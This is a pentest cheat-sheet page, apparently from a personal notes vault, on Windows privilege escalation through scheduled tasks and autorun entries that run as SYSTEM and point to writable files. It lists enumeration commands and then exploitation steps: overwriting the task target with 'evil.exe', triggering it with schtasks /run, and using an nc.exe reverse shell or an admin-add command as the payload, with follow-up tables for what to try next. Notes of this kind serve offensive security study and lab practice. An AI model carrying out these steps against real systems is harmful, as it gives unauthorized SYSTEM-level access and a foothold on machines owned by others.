# 🪟 Scheduled Tasks & Autoruns

> A scheduled task or autorun entry that executes a **writable script/binary** as SYSTEM/admin → replace the target and wait for it to fire. The Windows analogue of Linux cron abuse.

Part of [[Windows Privilege Escalation]]. Related: [[Windows Service Exploits]] · [[Shells]]

---

## 🧠 THINK
- List tasks + **who they run as** + **what they execute**; attack ones running as SYSTEM/admin with a writable target.
- Autoruns (`HKLM\...\Run`, startup folders) with writable entries → same idea.
- PowerUp covers both; verify write access with `accesschk`/`icacls`.

## ⚡ DETECT
```cmd
schtasks /query /fo LIST /v | findstr /i "TaskName Run As Task To Run"
```
Check write access to a task's target binary/script:
```cmd
icacls "C:\path\to\task_target.exe"
```
Autoruns / startup:
```powershell
. .\PowerUp.ps1; Invoke-AllChecks        # includes autoruns + task checks
```
```cmd
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```
**Look for:** a task "Run As" SYSTEM/admin whose "Task To Run" points to a file/dir you can write.

## 💥 EXPLOIT
Replace the writable task target with your payload:
```cmd
copy /y evil.exe "C:\path\to\task_target.exe"
```
Or if it's a script, append a payload line. Then trigger (or wait for schedule):
```cmd
schtasks /run /tn "<TaskName>"
```
Payload can be a reverse shell (`nc.exe ... -e cmd`) or an admin-add command. Start your listener first.

## 🔁 FOUND → NEXT
| FINDING | NEXT |
|---|---|
| Task as SYSTEM + writable target | replace target → run/wait → SYSTEM |
| Writable autorun entry/binary | replace → triggers at logon/boot |
| PowerUp flags a task/autorun | use its abuse hint |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| Target not writable | check the containing **directory** perms; different task |
| Can't run the task manually | wait for its schedule; or find a frequently-run one |
| No abusable tasks/autoruns | pivot to [[Token Privileges & Potato]] / [[Windows Service Exploits]] |

## 📇 CHEAT SHEET
```cmd
schtasks /query /fo LIST /v | findstr /i "TaskName Run As Task To Run"
```
```cmd
icacls "C:\path\to\target.exe"
```
```cmd
copy /y evil.exe "C:\path\to\target.exe" & schtasks /run /tn "<Task>"
```
**Kill shot:** SYSTEM task + writable target → replace → SYSTEM.
